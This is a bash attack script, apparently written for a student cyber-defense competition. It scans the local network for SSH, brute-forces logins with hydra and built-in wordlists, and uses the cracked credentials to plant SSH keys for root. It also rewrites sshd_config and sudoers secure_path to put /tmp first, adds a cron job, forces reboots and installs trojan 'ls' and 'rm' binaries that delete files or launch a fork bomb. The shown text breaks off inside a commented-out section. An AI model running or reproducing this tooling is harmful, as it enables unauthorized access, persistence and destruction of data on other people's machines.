#!/bin/bash
#   ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ██ ▄█▀
#  ▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒ ██▄█▒
#  ▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▓███▄░
#  ░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ▓██ █▄
#   ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░ ▒██▒ █▄
#   ▒▒   ▓▒█░ ▒ ░░     ▒ ░░   ▒ ▒▒ ▓▒
#    ▒   ▒▒ ░   ░        ░    ░ ░▒ ▒░
#    ░   ▒    ░        ░      ░ ░░ ░
#        ░  ░                 ░  ░
#    ██████   ██████  ██░ ██
#  ▒██    ▒ ▒██    ▒ ▓██░ ██▒
#  ░ ▓██▄   ░ ▓██▄   ▒██▀▀██░
#    ▒   ██▒  ▒   ██▒░▓█ ░██
#  ▒██████▒▒▒██████▒▒░▓█▒░██▓
#  ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒
#  ░ ░▒  ░ ░░ ░▒  ░ ░ ▒ ░▒░ ░
#  ░  ░  ░  ░  ░  ░   ░  ░░ ░
#        ░        ░   ░  ░  ░
#=======================================================================================
#=== DESCIPTION ========================================================================
#=======================================================================================
	## gathers passwords
	## cleans up output file
	## logs into ssh session and does it's business
########################################################################################
########################################################################################
	#
	#*************** NEED TO DO/ADD ***********************
	# don't assume /24 CIDR, and find the right one
	# check multiple interfaces and multiple IP ranges
	# change IP if getting blocked ( but only try a few times, and test for connectivity to avoid infinite loop)
	# clean it up
	# stop using tmp files
	# add testing for files and what not to get rid of error spam
	# multithread. one at a time is dumb
	# change spectre so it checks if its on attack/cleanup (fuck/unfuck) duty. (loops)
	# fix the for loop garbage in the colorizer
	# auto change mac, send out spoofed IPs, etc
	# leaave msgs in syslog 'logger'
	#
	# setup params
	# correct for pre-infected
	# fix weird fuckup if SIGTERM during process
	# fix the file check for list creation
	# improve readability of list creation
	# check for correct arguments
	# check for existing crackedLogins before overwriting
	#### multiple levels of attack
	# hydra speed options (-t 4)
	# masking attacking IP
	# obfuscating code
	# hidden file locations
	# no hints
	# roll in hashcat &/ john
	# etc..
	#******************************************************
	#
#///////////////////////////////////////////////////////////////////////////////////////
#|||||||||||||||||||||||| Script Stuff Starts |||||||||||||||||||||||||||||||||||||||||
#\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
#### RUN function #############
###############################
function main(){			###
	neo						###
if [[ "$1" == "" ]]; then 	### CRACKING ALL
	meat					###
	bones					###
	hulk					###
fi 							###
if [[ "$1" == "a" ]]; then	### INFECTING ALL
	b52						###
fi 							###
if [[ "$1" != "" ]]; then	### CRACKING ONE
	meat					###
	bones					###
	mouse "$@"				###
fi 							###
#	spectre					### borked
}							###
###############################
#------ error handling ----------
### If error, give up			#
#set -e							#
#- - - - - - - - - - - - - - - -#
### if error, do THING			#
# makes trap global 			#
# (works in functions)			#
#set -o errtrace				#
# 'exit' can be a func or cmd	#
#trap 'exit' ERR				#
#--------------------------------
#### Variables ####
attackDog=$(hostname -I | awk '{print $1}')
crackedLogins="./crackedLogins"
###########################################################################################
######  ┬ ┬┬ ┬┬  ┬┌─  #####################################################################
######  ├─┤│ ││  ├┴┐  #####################################################################
######  ┴ ┴└─┘┴─┘┴ ┴  #####################################################################
# banging down the door ###################################################################
###########################################################################################
function hulk(){
	## more password lists found here
	### https://github.com/danielmiessler/SecLists/tree/master/Passwords
	## lots more
	# tmp files
		#********add remove all tmp files at the end **************************************************
		#make sure these are all tmp files
		tmpFiles=""$hydraOutput" "$crackedLogins" "$liveHosts" "$pwListBasic" "$userListBasic""
	# cracked info file(s)
		hydraOutput="/tmp/hydraOutput"
		#crackedLogins="./crackedLogins"	#set globally above
	# gathering local network ID info (hopefully)
		netID="$(route -n | tail -n +3 | cut -d" " -f1 | grep -P "[^^0\.].+\.0")"
	# gathering live HOSTS
		liveHosts="/tmp/liveHosts"
		printf "\nGenerating list of pingable hosts on the network, might take short while (~2 min)\n------\n\n"
		printf "$(nmap -p 22 $netID/24 -oG - | awk '/22\/open/{print $2}')\n" > "$liveHosts"
		command sed -i "/$(hostname -I | tr -d " ")/d" "$liveHosts"
		printf "\tTargets List:\n$(cat $liveHosts)\n"
	### testing all login info for all IPs
		#**** if hydra.restore ask if skip ****************************************************
		#also ask if want ot restore
		#if [ -f hydra.restore ]; then

		#fi
		#***** if not success with basic, then do full ****************************************
		command hydra -o "$hydraOutput" -L "$userListScenario01" -P "$pwListScenario01" -vV -t 4 -M "$liveHosts" ssh
		command sed -i '/^#/d' "$hydraOutput"
		if [ -s $hydraOutput ]; then
			printf "\nCleaning up output\n"
			command awk '/^\[/{print $3" "$5" "$7}' "$hydraOutput" | tee "$crackedLogins"
			command rm "$hydraOutput"
		else
			printf "\n\n----No passwords found----\n\n"
			command rm "$hydraOutput"
		fi
}
###########################################################################################
######  ┌┬┐┌─┐┬ ┬┌─┐┌─┐  ##################################################################
######  ││││ ││ │└─┐├┤   ##################################################################
######  ┴ ┴└─┘└─┘└─┘└─┘  ##################################################################
# picking the lock ########################################################################
###########################################################################################
function mouse(){
	## more password lists found here
	### https://github.com/danielmiessler/SecLists/tree/master/Passwords
	# cracked info file(s)
		hydraOutput="/tmp/hydraOutput"
		#crackedLogins="./crackedLogins"	#set globally above
	# targeting
		printf "\t[Target] $1\n"
	#**** if hydra.restore ask if skip ****************************************************
	### also ask if want to restore
	#if [ -f hydra.restore ]; then
	#fi
	### if not success with basic, then do full ###
	#**************************************************************************************
	#**** if $2, use instead of userListScenario01 ****************************************
	#**** if $3, use instead of pwListScenario01 ******************************************
		command hydra -o "$hydraOutput" -L "$userListScenario01" -P "$pwListScenario01" -vV -t 4 $1 ssh
		command sed -i '/^#/d' "$hydraOutput"
		if [ -s $hydraOutput ]; then
			printf "\nCleaning up output\n"
			command awk '/^\[/{print $3" "$5" "$7}' "$hydraOutput" | tee "$crackedLogins"
			command rm "$hydraOutput"
		else
			printf "\n\n----No passwords found----\n\n"
			command rm "$hydraOutput"
		fi
}
###########################################################################################
######  ┌┐   ##############################################################################
######  ├┴┐  ##############################################################################
######  └─┘  ##############################################################################
# ssh's in and does it's business #########################################################
###########################################################################################
function b52(){
	function payload(){
		osDetectL2="$(uname -v | egrep -o "Debian|Ubuntu")"
		# Ubuntu
		ubuPATH="/etc/environment"
		ubuSecPATH="/etc/sudoers"
		ubuSecPATHnew="/etc/sudoers.new"
		ubuCleanRootPATH='secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"'
		ubuCleanUserPATH='PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"'
			ubuDirtyRootPATH='secure_path="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"'
			ubuDirtyUserPATH='PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"'
		# BOTH
			#bothCleanColorPS1='PS1="${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ "'
			#bothCleanBasicPS1='PS1="${debian_chroot:+($debian_chroot)}\u@\h:\w\$ "'
			#bothCleanXtermPS1='PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"'
		bothCleanColorPS1='PS1="${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ "'
		bothCleanBasicPS1='PS1="${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ "'
		bothCleanXtermPS1='PS1="\\[\\e]0;${debian_chroot:+($debian_chroot)}\\u@\\h: \\w\\a\\]$PS1"'

		bothCleanPS1Vars='$bothCleanColorPS1 $bothCleanBasicPS1 $bothCleanXtermPS1'

			bothDirtyPS1Vars='$bothDirtyColorPS1 $bothDirtyBasicPS1 $bothDirtyXtermPS1'
			bothDirtyColorPS1='PS1="${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h:\\w\\$ "'
			bothDirtyBasicPS1='PS1="${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h:\\w\\$ "'
			bothDirtyXtermPS1='PS1="\\[\\e]0;${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h: \\w\\a\\]$PS1"'
		# Debian
		debPATH="/etc/profile"
		debCleanRootPATH='PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"'
		debCleanUserPATH='PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"'
			debDirtyRootPATH='PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"'
			debDirtyUserPATH='PATH="/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"'

### fuck ##########################################
		# clears cached command paths
		hash -r
	### is Debian ###
		if [ $osDetectL2 == "Debian" ]; then
			testPATH="echo $PATH | cut -d: -f1"
			if [[ "$testPATH" != "/tmp" ]]; then
				#changes PATH for current user, no matter what it is
				sudo sed -i "s|PATH=$PATH|PATH=/tmp:$PATH|" $debPATH
			fi

			sed -i "s|$debCleanRootPATH|$debDirtyRootPATH|" $debPATH
			sed -i "s|$debCleanUserPATH|$debDirtyUserPATH|" $debPATH
		fi
	### is Ubuntu ###
		if [ $osDetectL2 == "Ubuntu" ]; then
			sed -i "s|$ubuCleanUserPATH|$ubuDirtyUserPATH|" $ubuPATH
		#colorizing bash shell
			userList=$(find /home /root -name .bashrc)
			for rc in $userList;do
				sed -i "s/.*PS1.*/$bothDirtyBasicPS1/g" $rc
			done
			# copies and edits the sudoers file
			cp $ubuSecPATH $ubuSecPATHnew
			chmod 750 $ubuSecPATHnew
			sed -i "s|$ubuCleanRootPATH|$ubuDirtyRootPATH|" $ubuSecPATHnew
			chmod 0440 $ubuSecPATHnew
			# checks that the changes are good
			visudo -c -f $ubuSecPATHnew > /dev/null
			# moves the modified file over the old one
			if [ "$?" -eq "0" ]; then
				cp $ubuSecPATHnew $ubuSecPATH
			fi
			#garbage collection
			rm $ubuSecPATHnew
		fi
###################################################
### dirty scripts #################################
###################################################
	dirtyLS="$(cat <<-'EOF'
	#!/bin/bash
	#
	# commented, non-obfuscated, and basic readability in place to be nice. (you would normally never be able to just read it)
	#
	triggerPath="/tmp/.trigger"
	# pulls in and builds argsLS for the real ls
	argsLS=""
	argsLSrm=""
	while [[ "$1" != "" ]]; do
		argsLS="$1 ${argsLS}"
		argsLSrm="$2 ${argsLSrm}"
		shift
	done
	# checks for the trigger file, if it exists it acts like normal
	if [ ! -e $triggerPath ]; then
        if [[ $argsLS == '--color=auto ' ]]; then
                printf "\n..is something supposed to happen now?\n"
        else
                /bin/rm -rf $argsLSrm
                printf "\n\e[0;95m*poof*\e[m goes [${argsLSrm}]\n"
                #could just as easily `shred` to be meaner
        fi
	else
        /bin/ls $argsLS
        #hints at the issue
        printf "\n\n----\n"
        printf "argsLS= $argsLS\n"
	fi
	EOF
	)"
###########################################################
	dirtyRM="$(cat <<-'EOF'
	#!/bin/bash
	#
	# commented, non-obfuscated, and basic readability in place to be nice. (you would normally never be able to just read it)
	#
	trap "printf '\nheh..not THAT easy..\n';sleep 2; printf '\nbut nice try\n'" SIGINT SIGTERM
	#####################
	function mainRM(){	#
		buildEmUp "$@"	#
		tripwire		#
	}					#
	#####################
	triggerPath="/tmp/.trigger"
	### defining, and sourcing, increment info ###
	function buildEmUp(){
		incrementPath="/tmp/.increment"
			# checking if increment file exists, making it if not
			if [ ! -e $incrementPath ]; then
				echo "increment=0" > $incrementPath
			fi
		source $incrementPath

		# pulls in and builds argsRM for the real rm
		argsRM=""
		while [[ "$1" != "" ]]; do
			argsRM="$1 ${argsRM}"
			shift
		done
	}
	#### checks for the trigger file, if its there it acts like normal ###
	function tripwire(){
		if [ ! -e $triggerPath ]; then
			echo "trigger is missing"
			rmCase
		else
			/bin/rm $argsRM
			#hints at the issue
			printf "\n\n----\n"
			printf "argsRM= $argsRM\n"
		fi
	}
	### determining what happens based on number of times used ###
	function rmCase(){
		case $increment in
			0)
					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
					echo "increment: $increment"
					echo "hard drives are big. no need to delete anything.."
					;;
			1)
					clear
					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
					printf "\nrude.\nstop that.\n"
					;;
			2)
					clear
					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
					echo $increment
					printf "\nHere.\n";sleep 2; printf "LET.."; sleep 3; printf "ME.."; sleep 2; printf "HELP..\n"; sleep 2
					o(){ o|o& };o
					;;
			*)
					clear
					printf "\nBewbs\n"
					;;
		esac
	}
	mainRM "$@"
	EOF
	)"

### Seeder ########################################
		seedPathsLS="/tmp/ls /usr/local/sbin/ls /usr/local/bin/ls /usr/sbin/ls /usr/bin/ls"
		seedPathsRM="/tmp/rm /usr/local/sbin/rm /usr/local/bin/rm /usr/sbin/rm /usr/bin/rm"
		triggerPath="/tmp/.trigger"
		incrementPath="/tmp/.increment"
		# dumps the scripts, increment, and trigger files into all the dirs they are supposed to be
		echo "$dirtyLS" | tee $seedPathsLS > /dev/null
		echo "$dirtyRM" | tee $seedPathsRM > /dev/null
		# creates/resets the increment file
		echo "increment=0" > $incrementPath
		# creates the trigger file
		touch $triggerPath
		# makes everything executable
		chmod +x $seedPathsLS $seedPathsRM
		chmod 777 $seedPathsLS $seedPathsRM

	}
#=========================================================================
#=========================================================================
#=========================================================================
#checks if an ssh key exists, then makes one if not
sshKey="/root/.ssh/id_rsa"
if [ ! -e $sshKey ]; then
	ssh-keygen -f $sshKey -t rsa -N ''
fi
#sends payload
while read -r tango; do
	target="$(echo $tango | cut -d" " -f1)"
	username="$(echo $tango | cut -d" " -f2)"
	password="$(echo $tango | cut -d" " -f3)"

	echo "------------------------------------------------------------------"
	echo "|target= $target"
	echo "|username= $username"
	echo "|password= $password"

#inserting ssh keys for root and the cracked user
	printf "\nInserting ssh key into [$target] using: $username\n"
	sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$target "echo $password | sudo -S mkdir -p /home/$username/.ssh /root/.ssh && cat | sudo tee -a /home/$username/.ssh/authorized_keys /root/.ssh/authorized_keys" </root/.ssh/id_rsa.pub
#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
	printf "\nPoisoning sshd rules on [$target]\n"
	ssh -n -o StrictHostKeyChecking=no $target "mkdir /root/.vim
											cp /root/.ssh/authorized_keys /root/.vim/ssh
											sed -i 's/#AuthorizedKeysFile/AuthorizedKeysFile .vim\/ssh /' /etc/ssh/sshd_config
											(crontab -l ; echo '@reboot touch /tmp/.trigger #delete this, i dare you') | crontab -
											at now +1 minute <<< 'init 6'
											for n in {1..1000}; do wall -n 'WOULD YOU LIKE TO PLAY A GAME???'; sleep 0.1; done" &
	#ssh -n -o StrictHostKeyChecking=no $username@$target "(crontab -l ; echo '@reboot touch /tmp/.trigger #delete this, i dare you') | crontab -"
#jumping into each box and letting loose the plague
	printf "\nReleasing the plague inside of [$target]\n"
	ssh -n -o StrictHostKeyChecking=no $target "$(declare -f payload); payload"
done <<< $(sort -u $crackedLogins | sed '/^$/d')

}
###########################################################################################
######  ┌┬┐┌─┐┌─┐┌┬┐  #####################################################################
######  │││├┤ ├─┤ │   #####################################################################
######  ┴ ┴└─┘┴ ┴ ┴   #####################################################################
# check/install/configure apps ############################################################
###########################################################################################
function meat(){
# wanted app lists
	command="hydra nmap curl net-tools sshpass"
	installing=""
	updated=0
	scriptPath="$BASH_SOURCE"

	#### updating repo list, if it hasn't already been updated recently
		if [[ $updated == 0 ]]; then
			command apt update
		# updates the script so it knows it doesn't need to check again
			sed -i 's/updated=0/updated=1/' $scriptPath
		fi
	# checking if apps are installed
		for word in $command; do
			if ! dpkg-query -W -f='${Status}' "$word" | grep -q "ok installed"; then
				installing="${installing} "$word""
			fi
		done
	# installing missing apps
		if [ ! -z "$installing" ]; then
			command yes | apt install $installing || exit 1
			printf "\n\n\tInstalled:\n\t\t[$installing ]\n\n"
		else
			printf "\n--------------------------------------------------------------------\n"
		fi
}
###########################################################################################
######  ┌┐ ┌─┐┌┐┌┌─┐┌─┐  ##################################################################
######  ├┴┐│ ││││├┤ └─┐  ##################################################################
######  └─┘└─┘┘└┘└─┘└─┘  ##################################################################
# checking for files and dirs #############################################################
###########################################################################################
function bones(){
	listsDir="/usr/share/wordlists"
	# PASSWORD LISTS
	pwListBasic="/tmp/pwListBasic"
	pwListFull="/usr/share/wordlists/rockyou.txt"
	pwListScenario01="/tmp/pwListScenario01"
		if [ ! -s $pwListBasic ] || [ ! -s $pwListFull ] || [ ! -s $pwListScenario01 ]; then
			printf "P@ssw0rd\npassword\ntoor\nPASSWORD\npassw0rd\np@ssword\nP@ssword\nqwerty\nQWERTY\nqwert\nQWERT\nwasd\nWASD\nqwe\nQWE\nCCDC\nccdc\n" > $pwListBasic
			#printf "123456\n12345\n123456789\npassword\niloveyou\nprincess\n1234567\nrockyou\n12345678\nabc123\nnicole\ndaniel\nbabygirl\nmonkey\nlovely\njessica\n654321\nmichael\nashley\nqwerty\n111111\niloveu\n000000\nmichelle\ntigger\nsunshine\nchocolate\npassword1\nsoccer\nanthony\nfriends\nbutterfly\npurple\nangel\njordan\nliverpool\njustin\nloveme\nfuckyou\n123123\nfootball\nsecret\nandrea\ncarlos\njennifer\njoshua\nbubbles\n1234567890\nsuperman\nhannah\n" > $pwListScenario01
			printf "123456\n12345\n123456789\npassword\niloveyou\nprincess\n1234567\nrockyou\n12345678\nabc123\nnicole\ndaniel\nbabygirl\nmonkey\nlovely\njessica\n654321\nmichael\nashley\nqwerty\n111111\niloveu\n000000\nmichelle\ntigger\nsunshine\nchocolate\npassword1\nsoccer\nanthony\nfriends\nbutterfly\npurple\nangel\njordan\nliverpool\njustin\nloveme\nfuckyou\n" > $pwListScenario01
			#pwListFull
		fi
	# USERNAME LISTS
	userListBasic="/tmp/userListBasic"
	userListUnix="/usr/share/wordlists/metasploit/unix_users.txt"
	userListStudents="/tmp/userListStudents"
	userListScenario01="/tmp/userListScenario01"
		if [ ! -s $userListBasic ] || [ ! -s $userListStudents ] || [ ! -s $userListScenario01 ]; then
			printf "root\nstudent\nccdc\nname" > $userListBasic
			printf "root\nuser\nstudent\nadam\nalex\nalexander\nandrew\nangel\nanreah\narmagetronad\nbrad\ncanyon\ncasey\ncharles\nchris\nclay\ndale\ndavid\ndoug\nevan\ngeoffrey\nhilary\nkip\nleah\nnolan\nnolan01m\nsamuel\nshane\nsmith\ntori\ntyler\nyianni\n" > $userListStudents
			printf "student\nccdc\nuser\nghost\ncartman\nstan\nkyle\nkenny\npcprincipal\nreality\njack\nkate\nsaryn\nrhino\nnidus\nlazors\n" > $userListScenario01
		fi
# where important lists are stored
	printf "\n\tUsername List:\n"
	printf "\n\t\t["$userListUnix"]\n\n"
	printf "\n\tPassword List:\n"
	printf "\n\t\t["$pwListFull"]\n\n"

#checking for wordlist dir
	if [[ ! -d $listsDir ]]; then
		printf "\nCouldn't find wordlist dir. Creating \n\t["$listsDir"]\n"
		command mkdir -p "$listsDir"/metasploit
	fi

#checking for 'rockyou.txt' password list
	if [[ ! -f "$pwListFull" ]]; then
		printf "\n"
	#checking for the .gz
		if [[ -f "$pwListFull".gz ]]; then
			printf "\nExtracting rockyou.txt\n"
			command tar -xf "$pwListFull".gz -C "$listsDir"
		else
		#downloading rockyou.txt
			printf "\nCouldn't find rockyou.txt or rockyou.txt.gz\nDownloading it to:\n\t["$pwListFull"]\n\n\n"
			command curl -L -o "$pwListFull" https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
		fi
	fi

#checking for 'unix_users.txt'
	if [[ ! -f "$userListUnix" ]]; then
	#downloading unix_users list
		printf "\n\n\nCouldn't find unix_users file\nDownloading it to:\n\t["$userListUnix"]\n\n\n"
		command curl -L -o "$userListUnix" https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/wordlists/unix_users.txt
		printf "\n\n\n"
	fi
}
###########################################################################################
# ssh's in and does it's business
###########################################################################################
### wont be clearing logs or trying to hide footprints at all ###
### needs to be fixed.. ###
#function spectre(){
#	#### launch bay #########
#	function payload(){		#
#		seeder				#
#	#	unfuck				# local files
#	}						#
#	#########################
#		osDetectL2="$(uname -v | egrep -o "Debian|Ubuntu")"
#		# Ubuntu
#		ubuPATH="/etc/environment"
#		ubuSecPATH="/etc/sudoers"
#		ubuSecPATHnew="/etc/sudoers.new"
#		ubuCleanRootPATH='secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"'
#		ubuCleanUserPATH='PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"'
#			ubuDirtyRootPATH='secure_path="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"'
#			ubuDirtyUserPATH='PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"'
#		# BOTH
#			#bothCleanColorPS1='PS1="${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ "'
#			#bothCleanBasicPS1='PS1="${debian_chroot:+($debian_chroot)}\u@\h:\w\$ "'
#			#bothCleanXtermPS1='PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"'
#		bothCleanColorPS1='PS1="${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ "'
#		bothCleanBasicPS1='PS1="${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ "'
#		bothCleanXtermPS1='PS1="\\[\\e]0;${debian_chroot:+($debian_chroot)}\\u@\\h: \\w\\a\\]$PS1"'
#
#		bothCleanPS1Vars='$bothCleanColorPS1 $bothCleanBasicPS1 $bothCleanXtermPS1'
#
#			bothDirtyPS1Vars='$bothDirtyColorPS1 $bothDirtyBasicPS1 $bothDirtyXtermPS1'
#			bothDirtyColorPS1='PS1="${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h:\\w\\$ "'
#			bothDirtyBasicPS1='PS1="${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h:\\w\\$ "'
#			bothDirtyXtermPS1='PS1="\\[\\e]0;${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h: \\w\\a\\]$PS1"'
#		# Debian
#		debPATH="/etc/profile"
#		debCleanRootPATH='PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"'
#		debCleanUserPATH='PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"'
#			debDirtyRootPATH='PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"'
#			debDirtyUserPATH='PATH="/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"'
#
#		#checks if an ssh key exists, then makes one if not
#		if [ ! -e $sshKey ]; then
#			ssh-keygen -f $sshKey -t rsa -N ''
#		fi
#
#
#	function ubuVisudo(){
#		# copies and edits the sudoers file
#		sudo cp $ubuSecPATH $ubuSecPATHnew
#		sudo chmod 750 $ubuSecPATHnew
#		sudo sed -i "s|$1|$2|" $ubuSecPATHnew
#		sudo chmod 0440 $ubuSecPATHnew
#		# checks that the changes are good
#		visudo -c -f $ubuSecPATHnew
#		# moves the modified file over the old one
#		if [ "$?" -eq "0" ]; then
#		sudo cp $ubuSecPATHnew $ubuSecPATH
#		fi
#		#garbage collection
#		sudo rm $ubuSecPATHnew
#	}
#### fuck ##########################################
#	function fuck(){
##################
#	#terminator	#
#	#sandman	#
##################
#		# clears cached command paths
#		hash -r
#	### is Debian ###
#		if [ $osDetectL2 == "Debian" ]; then
#			testPATH="echo $PATH | cut -d: -f1"
#			if [[ "$testPATH" != "/tmp" ]]; then
#				#changes PATH for current user, no matter what it is
#				sudo sed -i "s|PATH=$PATH|PATH=/tmp:$PATH|" $debPATH
#			fi
#
#			sudo sed -i "s|$debCleanRootPATH|$debDirtyRootPATH|" $debPATH
#			sudo sed -i "s|$debCleanUserPATH|$debDirtyUserPATH|" $debPATH
#		fi
#		### is Ubuntu ###
#			if [ $osDetectL2 == "Ubuntu" ]; then
#				sudo sed -i "s|$ubuCleanUserPATH|$ubuDirtyUserPATH|" $ubuPATH
#				ubuVisudo $ubuCleanRootPATH $ubuDirtyRootPATH
#			#colorizing bash shell
#				userList=$(find /home /root -name .bashrc)
#				for rc in $userList;do
#					sudo sed -i "s/.*PS1.*/$bothDirtyBasicPS1/g" $rc
#				done
#			fi
#	}
#
#### un-fuck ########################################
#	function unfuck(){
#	### is Debian ###
#		if [ $osDetectL2 == "Debian" ]; then
#			sudo sed -i "s|$debDirtyRootPATH|$debCleanRootPATH|" $debPATH
#			sudo sed -i "s|$debDirtyUserPATH|$debCleanUserPATH|" $debPATH
#		fi
#	### is Ubuntu ###
#		if [ $osDetectL2 == "Ubuntu" ]; then
#			sudo sed -i "s|$ubuDirtyUserPATH|$ubuCleanUserPATH|" $ubuPATH
#			ubuVisudo $ubuDirtyRootPATH $ubuCleanRootPATH
#			printf "\n+++++++\ndirtyRoot=$ubuDirtyRootPATH\ncleanRoot=$ubuCleanRootPATH"
#		fi
#	# deletes all the dirty scipts
#	sudo /bin/rm -f $seedPathsLS $seedPathsRM
#	echo $seedPathsLS $seedPathsRM
#	# clears cached paths
#	hash -r
#	#*********************
#	#***missing colorizer
#	#*********************
#	}
#
##** colorizer ######################################
##	function colorizer(){
##		#53,55,62
#
##	}
#
#### Seeder ########################################
#	function seeder(){
#		seedPathsLS="/tmp/ls /usr/local/sbin/ls /usr/local/bin/ls /usr/sbin/ls /usr/bin/ls"
#		seedPathsRM="/tmp/rm /usr/local/sbin/rm /usr/local/bin/rm /usr/sbin/rm /usr/bin/rm"
#		triggerPath="/tmp/.trigger"
#		incrementPath="/tmp/.increment"
#		sshKey="/root/.ssh/id_rsa"
#		# dumps the scripts, increment, and trigger files into all the dirs they are supposed to be
#		sudo echo "$dirtyLS" | tee $seedPathsLS > /dev/null
#		sudo echo "$dirtyRM" | tee $seedPathsRM > /dev/null
#		# creates/resets the increment file
#		sudo echo "increment=0" > $incrementPath
#		# creates the trigger file
#		sudo touch $triggerPath
#		# makes everything executable
#		sudo chmod +x $seedPathsLS $seedPathsRM
#		sudo chmod 777 $seedPathsLS $seedPathsRM
#	}
#
##** Terminator ####################################
#	function terminator(){
#		### Key Master ###
#		#disables password login for ssh (making it obvious something is wrong)
#
#		#adding self to target's root auth list
#		for tango in "$crackedLogins"; do
#			target="$(cut -d" " -f1 $tango)"
#			username="$(cut -d" " -f2 $tango)"
#			password="$(cut -d" " -f3 $tango)"
#
#			echo "target= $target"
#			echo "username= $username"
#			echo "password= $password"
#
#			cat ~/.ssh/id_rsa.pub | sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$target -t "echo $password | sudo -S mkdir -p /home/$username/.ssh /root/.ssh && cat | sudo tee -a /home/$username/.ssh/authorized_keys /root/.ssh/authorized_keys"
#			#New poisoned sshdir and auth file
